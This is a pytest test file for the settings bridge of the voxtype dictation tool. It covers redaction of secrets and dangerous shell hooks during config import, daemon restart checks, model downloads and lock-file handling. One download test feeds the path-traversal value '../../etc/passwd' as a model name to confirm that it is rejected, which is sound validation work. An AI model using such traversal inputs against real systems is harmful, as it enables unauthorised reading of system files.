    assert res["ok"] is False and res["error"] == "dangerous-changes"
    assert res["dangerous"] == ["output.pre_recording_command"]
    assert isinstance(res["diff"]["settings_change"], list)
    assert isinstance(res["warnings"], list)
    # accept_dangerous still defaults to False (C3): an explicit false
    # and an absent flag behave identically.
    assert env.fail("import.apply", path=str(p), include_settings=True,
                    accept_dangerous=False)["error"] == "dangerous-changes"


def test_every_settings_row_is_json_safe(env: Env):
    """C4: the panel renders every row, so old/new must survive json.dumps."""
    p = _bundle(env, settings={
        "output": {"mode": "clipboard", "type_delay_ms": 7, "fallback_to_clipboard": False},
        "whisper": {"language": "fr"},
        "audio": {"feedback": {"volume": 0.25}},
    })
    res = env.ok("import.preview", path=str(p), include_settings=True)
    rows = res["diff"]["settings_change"]
    assert rows
    for row in rows:
        if row.get("redacted"):
            assert set(row) == {"path", "dangerous", "redacted", "old_set", "new_set"}
            assert "old" not in row and "new" not in row
        else:
            assert set(row) == {"path", "old", "new", "dangerous"}
            json.dumps(row)  # raises on a tomlkit wrapper leaking through
            for v in (row["old"], row["new"]):
                assert v is None or isinstance(v, (str, int, float, bool, list, dict))


def test_design_documents_secret_emission_accurately(env: Env):
    """C5: DESIGN.md used to claim the bridge never emits the values of
    all four REDACTED_IMPORT_PATHS. That was false — the user's own
    post_process/pre/post-output commands ARE in the load snapshot. The
    doc must describe what the code actually does.
    """
    design = (REPO / "docs" / "DESIGN.md").read_text()
    assert bridge.SECRET_SETTINGS == {"whisper.remote_api_key"}

    # The snapshot really does carry the shell-hook values ...
    env.ok("settings.set", path="output.post_process.command", value="tr a-z A-Z")
    snap = env.ok("load")["snapshot"]["settings"]
    assert snap["output.post_process.command"] == "tr a-z A-Z"
    # ... and really does not carry the API key.
    env.set_api_key("sk-NEVER-EMITTED")
    snap = env.ok("load")["snapshot"]["settings"]
    assert "whisper.remote_api_key" not in snap
    assert snap["whisper.remote_api_key_set"] is True
    assert "sk-NEVER-EMITTED" not in json.dumps(env.ok("load"))
    assert "sk-NEVER-EMITTED" not in json.dumps(env.ok("status"))

    # So the doc must scope the never-emit claim to the API key and scope
    # the redaction claim to import diff rows.
    assert "Only `whisper.remote_api_key` is **never** emitted" in design
    assert "in import diff rows specifically" in design
    assert "bridge never emits their values in any response" not in design


def test_import_preview_and_apply_never_leak_secret_values(env: Env):
    env.set_api_key("sk-SECRET123")
    env.ok("settings.set", path="output.post_process.command", value="old-hook --SECRETARG")
    p = _bundle(
        env,
        secrets={
            "whisper": {"remote_api_key": "sk-OTHER456"},
            "output": {
                "post_process": {"command": "new-hook --OTHERARG"},
                "pre_output_command": "pre-hook --OTHERARG",
            },
        },
    )
    key_leaks = ("sk-SECRET123", "sk-OTHER456")
    # The current post_process command is legitimately part of the
    # snapshot (editable Settings field); it must not appear in the diff.
    diff_leaks = key_leaks + ("SECRETARG", "OTHERARG")

    res = env.ok("import.preview", path=str(p))
    raw = json.dumps(res)
    for s in diff_leaks:
        assert s not in raw, s
    rows = {c["path"]: c for c in res["diff"]["settings_change"]}
    assert rows["whisper.remote_api_key"] == {
        "path": "whisper.remote_api_key", "dangerous": True, "redacted": True,
        "old_set": True, "new_set": True,
    }
    assert rows["output.post_process.command"] == {
        "path": "output.post_process.command", "dangerous": True, "redacted": True,
        "old_set": True, "new_set": True,
    }
    assert rows["output.pre_output_command"] == {
        "path": "output.pre_output_command", "dangerous": True, "redacted": True,
        "old_set": False, "new_set": True,
    }
    assert set(res["dangerous"]) == set(rows)

    refused = env.fail("import.apply", path=str(p))
    assert refused["error"] == "dangerous-changes"
    for s in diff_leaks:
        assert s not in json.dumps(refused), s

    applied = env.ok("import.apply", path=str(p), accept_dangerous=True)
    for s in key_leaks:
        assert s not in json.dumps(applied), s
    for s in diff_leaks:
        assert s not in json.dumps(applied["applied"]), s
    assert applied["applied"]["settings_change"] == res["diff"]["settings_change"]
    assert env.config_dict()["whisper"]["remote_api_key"] == "sk-OTHER456"


# ---------------------------------------------------------------------------
# daemon ops
# ---------------------------------------------------------------------------


def test_daemon_restart_proves_pid_change_and_waits_ready(env: Env):
    env.daemon(active=True)
    res = env.ok("daemon.restart")
    assert res["main_pid_before"] == 4242
    assert res["main_pid_after"] == 4243
    assert res["changed"] is True and res["ready"] is True and res["active"] is True
    calls = env.systemctl_calls()
    assert "--user restart voxtype" in calls
    assert calls.count("--user show voxtype -p MainPID -p ActiveState -p ExecMainStartTimestamp -p ExecMainStartTimestampMonotonic") == 2
    assert env.ok("status")["daemon"]["main_pid"] == 4243


def test_daemon_restart_from_stopped(env: Env):
    res = env.ok("daemon.restart")
    assert res["main_pid_before"] is None and res["main_pid_after"] == 4001
    assert res["ready"] is True


def test_daemon_restart_noop_is_not_ok(env: Env, monkeypatch):
    env.daemon(active=True)
    monkeypatch.setenv("FAKE_SYSTEMCTL_NOOP_RESTART", "1")
    res = env.call("daemon.restart")
    assert res["ok"] is False
    assert res["main_pid_before"] == res["main_pid_after"] == 4242
    assert res["changed"] is False and res["ready"] is False
    assert "did not change" in res["message"]


def test_daemon_restart_ready_timeout(env: Env, monkeypatch):
    env.daemon(active=True)
    # A restart that never writes the state file: fake systemctl writes
    # "idle" on restart, so point the daemon's state_file elsewhere.
    env.write_config(BASE_CONFIG.replace('state_file = "auto"', f'state_file = "{env.root}/never"'))
    t0 = time.monotonic()
    res = env.call("daemon.restart", timeout=0.3)
    elapsed = time.monotonic() - t0
    assert res["ok"] is True and res["changed"] is True and res["ready"] is False
    assert res["ready_timeout"] == 0.3
    assert elapsed < 3.0, elapsed


def test_daemon_restart_timeout_arg_is_honoured(env: Env, monkeypatch):
    env.daemon(active=True)
    seen: list[float] = []

    def fake_wait(path, timeout, poll=0.15):
        seen.append(timeout)
        return True

    monkeypatch.setattr(bridge, "_wait_for_daemon_ready", fake_wait)
    assert env.ok("daemon.restart")["ready_timeout"] == 18.0
    assert env.ok("daemon.restart", timeout=5)["ready_timeout"] == 5.0
    assert env.ok("daemon.restart", timeout=2.5)["ready_timeout"] == 2.5
    assert env.ok("daemon.restart", timeout=999)["ready_timeout"] == bridge.DAEMON_RESTART_READY_TIMEOUT_MAX
    assert seen == [18.0, 5.0, 2.5, bridge.DAEMON_RESTART_READY_TIMEOUT_MAX]
    assert bridge.DAEMON_RESTART_READY_TIMEOUT == 18.0
    env.fail("daemon.restart", timeout="soon")
    env.fail("daemon.restart", timeout=True)
    assert "--user restart voxtype" not in env.systemctl_calls()[-1]


def test_design_documents_restart_timeout():
    design = (REPO / "docs" / "DESIGN.md").read_text()
    assert "timeout:18" in design or "timeout: 18" in design


def test_daemon_restart_without_systemctl(env: Env):
    env.remove_fake("systemctl")
    res = env.call("daemon.restart")
    assert res["ok"] is False and res["changed"] is False
    assert "systemctl" in res["message"]


def test_daemon_start_stop(env: Env):
    res = env.ok("daemon.start")
    assert res["daemon"]["active"] is True and res["daemon"]["main_pid"] == 4001
    assert "--user start voxtype" in env.systemctl_calls()
    assert env.ok("status")["daemon"]["state"] == "idle"
    res = env.ok("daemon.stop")
    assert res["daemon"]["active"] is False
    assert "--user stop voxtype" in env.systemctl_calls()
    assert env.ok("status")["daemon"]["state"] == "stopped"


def test_daemon_start_failure(env: Env):
    env.remove_fake("systemctl")
    res = env.fail("daemon.start")
    assert "systemctl" in res["error"]


def test_record_toggle(env: Env):
    assert "record.toggle" in bridge.OPS  # QML may switch the bar button to it
    res = env.ok("record.toggle")
    assert res["message"] == "Recording started"
    assert env.voxtype_calls() == ["record toggle"]
    env.remove_fake("voxtype")
    res = env.fail("record.toggle")
    assert "voxtype binary not found" in res["error"]


def test_record_toggle_failures_carry_real_error(env: Env, monkeypatch):
    monkeypatch.setenv("FAKE_VOXTYPE_TOGGLE", "fail")
    res = env.fail("record.toggle")
    assert "Failed to connect to daemon socket" in res["error"]
    assert "\x1b[" not in res["error"]
    assert "daemon is not running" in res["error"]  # fixture daemon is stopped

    env.daemon(active=True)
    res = env.fail("record.toggle")
    assert "daemon is not running" not in res["error"]

    monkeypatch.setenv("FAKE_VOXTYPE_TOGGLE", "silent-fail")
    res = env.fail("record.toggle")
    assert "exited 7" in res["error"]

    monkeypatch.setenv("FAKE_VOXTYPE_TOGGLE", "hang")
    real_run = bridge._run
    monkeypatch.setattr(bridge, "_run", lambda argv, timeout: real_run(argv, 0.3))
    res = env.fail("record.toggle")
    assert "timed out" in res["error"]


# ---------------------------------------------------------------------------
# --download streaming mode
# ---------------------------------------------------------------------------


def test_download_streams_progress_and_creates_model(env: Env):
    r = env.run_cli(None, "--download", "whisper", "tiny")
    assert r.returncode == 0, r.stdout + r.stderr
    lines = r.stdout.splitlines()
    assert lines[0] == "LOG $ voxtype setup --download --model tiny"
    assert "PROGRESS 12.5" in lines
    assert "PROGRESS 50" in lines
    assert "PROGRESS 100" in lines
    assert lines[-1] == "DONE"
    assert any(l.startswith("LOG Downloading whisper model") for l in lines)
    progress_idx = [i for i, l in enumerate(lines) if l.startswith("PROGRESS")]
    assert progress_idx == sorted(progress_idx)
    assert (env.models_dir / "ggml-tiny.bin").stat().st_size == 1024
    assert all(l.split()[0] in {"PROGRESS", "LOG", "DONE"} for l in lines)
    assert env.ok("models.list", engine="whisper")["models"][0]["downloaded"] is True


def test_download_progress_is_streamed_not_batched(env: Env):
    """Progress lines must arrive while the download is still running
    (the fake sleeps 30 s after 'still downloading'), not at exit."""
    proc = subprocess.Popen(
        [sys.executable, str(BRIDGE), "--download", "whisper", "slow"],
        stdout=subprocess.PIPE, text=True, env=env.subprocess_env(),
    )
    assert proc.stdout is not None
    t0 = time.monotonic()
    seen: list[str] = []
    try:
        while time.monotonic() - t0 < 10:
            line = proc.stdout.readline()
            if not line:
                break
            seen.append(line.rstrip("\n"))
            if line.startswith("LOG still downloading"):
                break
        assert time.monotonic() - t0 < 10, seen
        assert "PROGRESS 12.5" in seen and "PROGRESS 87.5" in seen
    finally:
        proc.kill()
        proc.wait(timeout=10)


def test_download_failure(env: Env):
    r = env.run_cli(None, "--download", "whisper", "broken")
    assert r.returncode == 1
    lines = r.stdout.splitlines()
    assert lines[-1] == "FAILED exit 1"
    assert any("404" in l for l in lines)


def test_download_rejects_bad_arguments(env: Env):
    r = env.run_cli(None, "--download", "cohere", "tiny")
    assert r.returncode == 1 and r.stdout.startswith("FAILED unknown engine")
    r = env.run_cli(None, "--download", "whisper", "../../etc/passwd")
    assert r.returncode == 1 and r.stdout.startswith("FAILED invalid model name")
    r = env.run_cli(None, "--download", "whisper")
    assert r.returncode == 1 and r.stdout.startswith("FAILED usage")
    assert env.voxtype_calls() == []


def test_download_without_binary(env: Env):
    env.remove_fake("voxtype")
    r = env.run_cli(None, "--download", "whisper", "tiny")
    assert r.returncode == 1 and "FAILED voxtype binary not found" in r.stdout


def test_download_sigterm_cancels_and_removes_partial(env: Env):
    proc = subprocess.Popen(
        [sys.executable, str(BRIDGE), "--download", "whisper", "slow"],
        stdout=subprocess.PIPE, text=True, env=env.subprocess_env(),
    )
    assert proc.stdout is not None
    seen: list[str] = []
    deadline = time.monotonic() + 20
    while time.monotonic() < deadline:
        line = proc.stdout.readline()
        if not line:
            break
        seen.append(line.rstrip("\n"))
        if line.startswith("LOG still downloading"):
            break
    assert (env.models_dir / "ggml-slow.bin").exists()
    proc.send_signal(signal.SIGTERM)
    rest = proc.stdout.read().splitlines()
    code = proc.wait(timeout=20)
    assert code == 1
    assert rest[-1] == "FAILED cancelled"
    assert "LOG removed partial ggml-slow.bin" in rest
    assert not (env.models_dir / "ggml-slow.bin").exists()
    assert "PROGRESS 12.5" in seen


# ---------------------------------------------------------------------------
# TUI single-instance lock: the TUI buffers edits until Ctrl+S and then
# rewrites the whole config, so a panel write while it is open would be lost.
# ---------------------------------------------------------------------------


def _hold_tui_lock(env: Env):
    """Take the lock exactly the way voxtype-tui does at startup."""
    from voxtype_tui import single_instance

    lock = env.sidecar.parent / ".lock"
    result = single_instance.acquire(lock)
    assert result.acquired and result.fd is not None
    return lock, result.fd


def test_write_ops_are_refused_while_the_tui_holds_its_lock(env: Env):
    env.ok("vocab.add", phrase="before")
    lock, fd = _hold_tui_lock(env)
    try:
        res = env.fail("vocab.add", phrase="lost")
        assert "voxtype-tui is open" in res["error"]
        assert f"pid {os.getpid()}" in res["error"]
        assert res["tui_open_pid"] == os.getpid()
        for op, args in [
            ("dict.upsert", {"from": "a", "to": "b", "category": "Replacement"}),
            ("settings.set", {"path": "whisper.language", "value": "de"}),
            ("settings.unset", {"path": "whisper.language"}),
            ("vocab.remove", {"phrase": "before"}),
        ]:
            assert env.fail(op, **args)["tui_open_pid"] == os.getpid()
        # Nothing reached disk and the lockfile still carries the holder PID.
        assert env.config_dict()["whisper"]["initial_prompt"] == "before"
        assert lock.read_text().strip() == str(os.getpid())
        # Reads and status keep working and report who holds the lock.
        assert env.ok("load")["snapshot"]["vocabulary"][0]["phrase"] == "before"
        assert env.ok("status")["tui_open_pid"] == os.getpid()
    finally:
        os.close(fd)  # releases the flock, like the TUI exiting
    assert env.ok("status")["tui_open_pid"] is None
    assert env.ok("vocab.add", phrase="after")["snapshot"]["vocabulary"][1]["phrase"] == "after"


def test_stale_lockfile_without_a_holder_does_not_block_writes(env: Env):
    lock = env.sidecar.parent / ".lock"
    lock.parent.mkdir(parents=True, exist_ok=True)
    lock.write_text("424242\n")  # left behind by a crashed TUI: flock is gone
    assert env.ok("status")["tui_open_pid"] is None
    assert env.ok("vocab.add", phrase="fine")["ok"]
    assert lock.read_text() == "424242\n"  # the probe never rewrites the file


def test_write_ops_set_matches_dispatch_table():
    import bridge

    mutating = {op for op in bridge.OPS if op.split(".")[0] in {"vocab", "dict", "settings", "models", "gpu"} or op == "import.apply"}
    assert bridge.WRITE_OPS == mutating - {"models.list", "gpu.status"}


# ---------------------------------------------------------------------------
# F4: the lock probe runs on every write op and every status
# ---------------------------------------------------------------------------


def test_tui_lock_holder_does_not_block_on_fifo(env: Env):
    """F4 regression: os.open(lock, O_RDONLY) blocks forever on a FIFO.

    This probe fires on every write op and every status poll, so a FIFO
    at the lock path wedged the panel completely.
    """
    lock = env.sidecar.parent / ".lock"
    lock.parent.mkdir(parents=True, exist_ok=True)
    os.mkfifo(lock)
    paths = bridge._paths()
    assert paths.lock == lock

    with deadline(10, "tui_lock_holder on a FIFO"):
        assert bridge.tui_lock_holder(paths) is None
    # The op layer must stay usable too, not just the helper.
    with deadline(15, "status with a FIFO lock file"):
        assert env.ok("status")["tui_open_pid"] is None
    with deadline(15, "a write op with a FIFO lock file"):
        assert env.ok("vocab.add", phrase="Omarchy")["ok"] is True


def test_tui_lock_holder_refuses_a_symlinked_lock(env: Env):
    """O_NOFOLLOW: the probe must not be redirected to another file.

    Without O_NOFOLLOW the probe follows the link and reports the holder
    of whatever file it points at, so a symlink planted at the lock path
    can make the panel believe the TUI is open and refuse every write.
    """
    import fcntl as _fcntl

    target = env.root / "elsewhere"
    target.write_text(f"{os.getpid()}\n")
    lock = env.sidecar.parent / ".lock"
    lock.parent.mkdir(parents=True, exist_ok=True)
    lock.symlink_to(target)

    fd = os.open(target, os.O_RDWR)
    try:
        _fcntl.flock(fd, _fcntl.LOCK_EX | _fcntl.LOCK_NB)
        # Following the link would report os.getpid() here.
        assert bridge.tui_lock_holder(bridge._paths()) is None
        assert env.ok("status")["tui_open_pid"] is None
        # ... and writes stay available rather than being wedged shut.
        assert env.ok("vocab.add", phrase="Omarchy")["ok"] is True
    finally:
        os.close(fd)


def test_tui_lock_holder_ignores_a_directory_at_the_lock_path(env: Env):
    lock = env.sidecar.parent / ".lock"
    lock.mkdir(parents=True)
    assert bridge.tui_lock_holder(bridge._paths()) is None
    assert env.ok("status")["tui_open_pid"] is None


def test_tui_lock_holder_reports_holder_and_absence(env: Env):
    """F9 coverage: the helper had no direct unit test at all."""
    paths = bridge._paths()
    # Nothing there yet.
    assert bridge.tui_lock_holder(paths) is None
    # Stale file, no flock.
    paths.lock.parent.mkdir(parents=True, exist_ok=True)
    paths.lock.write_text("424242\n")
    assert bridge.tui_lock_holder(paths) is None
    # Real holder.
    lock, fd = _hold_tui_lock(env)
    try:
        assert bridge.tui_lock_holder(paths) == os.getpid()
    finally:
        os.close(fd)
    assert bridge.tui_lock_holder(paths) is None
    # Held but the file carries no readable PID -> -1 ("unknown holder").
    import fcntl as _fcntl

    fd2 = os.open(lock, os.O_RDWR)
    try:
        os.truncate(fd2, 0)
        _fcntl.flock(fd2, _fcntl.LOCK_EX | _fcntl.LOCK_NB)
        assert bridge.tui_lock_holder(paths) == -1
    finally:
        os.close(fd2)

